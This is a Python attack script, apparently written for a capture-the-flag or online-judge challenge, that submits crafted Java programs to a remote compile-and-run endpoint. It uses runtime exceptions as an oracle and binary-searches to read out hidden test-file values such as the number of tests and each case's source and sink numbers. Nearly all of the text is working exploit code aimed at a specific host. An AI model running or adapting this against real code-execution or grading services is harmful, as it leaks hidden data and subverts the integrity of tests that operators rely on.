import requests
from urllib.parse import quote

burp0_url = "http://157.230.16.162:10009/compile_and_run"
burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://157.230.16.162:10009", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://157.230.16.162:10009/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}

#This java code is used to get how many tests 
javatests = '''import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class Run {
    public static void main(String[] args) {

        File graph = new File(args[0]);
        File tests = new File(args[1]);

        List<String> graph_content = readFileContent(graph);
        List<String> test_content = readFileContent(tests);

        if (Integer.parseInt(test_content.get(FIRST)) > SECOND){
            throw new RuntimeException();
        }else{
            return;
        }
    }

    private static List<String> readFileContent(File file) {
        List<String> lines = new ArrayList<>();
        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
            String line;
            while ((line = reader.readLine()) != null) {
                lines.add(line);
            }
        } catch (IOException e) {
            System.err.println("An error occurred while reading the file: " + file.getPath());
            e.printStackTrace();
        }
        return lines;
    }
}
'''
#This java code is used to getting the inputs
javainputs = '''import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class Run {
    public static void main(String[] args) {

        File graph = new File(args[0]);
        File tests = new File(args[1]);

        List<String> graph_content = readFileContent(graph);
        List<String> test_content = readFileContent(tests);
        String[] parts = test_content.get(LINE).split(" ");
        int testint = Integer.parseInt(parts[INDEX]);
        if (testint > TEST){
            throw new RuntimeException();
        }else{
            return;
        }
    }

    private static List<String> readFileContent(File file) {
        List<String> lines = new ArrayList<>();
        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
            String line;
            while ((line = reader.readLine()) != null) {
                lines.add(line);
            }
        } catch (IOException e) {
            System.err.println("An error occurred while reading the file: " + file.getPath());
            e.printStackTrace();
        }
        return lines;
    }
}'''

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}

def islargerthan_tests(index,number):
    index = str(index)
    number = str(number)
    payload = javatests.replace("FIRST",index).replace("SECOND",number)
    burp0_data = {"code": payload}
    a = requests.post(burp0_url, proxies=proxies,headers=burp0_headers, data=burp0_data)
    if "runtime" in a.text:
        return True
    else:
        return False


def findtests():
    low, high = 1, 500000
    while low <= high:
        mid = (low + high) // 2
        if islargerthan_tests(0,mid):
            low = mid + 1
        else:
            high = mid - 1
    return low

#tests = findtests()
tests=8
print("tests:"+str(tests))
def islargerthan_inputs(line,index,test):
    payload = javainputs.replace("LINE",str(line)).replace("INDEX",str(index)).replace("TEST",str(test))
    burp0_data = {"code": payload}
    a = requests.post(burp0_url, proxies=proxies,headers=burp0_headers, data=burp0_data)
    if "runtime" in a.text:
        return True
    else:
        return False

for i in range(tests):
    low, high = 0, 500000
    while low <= high:
        mid = (low + high) // 2
        if islargerthan_inputs(i+1,0,mid):
            low = mid + 1
        else:
            high = mid - 1
    print("source on line: "+str(i+1)+" is "+str(low))
    low, high = 0, 500000
    while low <= high:
        mid = (low + high) // 2
        if islargerthan_inputs(i+1,1,mid):
            low = mid + 1
        else:
            high = mid - 1
    print("sink case on line: "+str(i+1)+" is "+str(low))

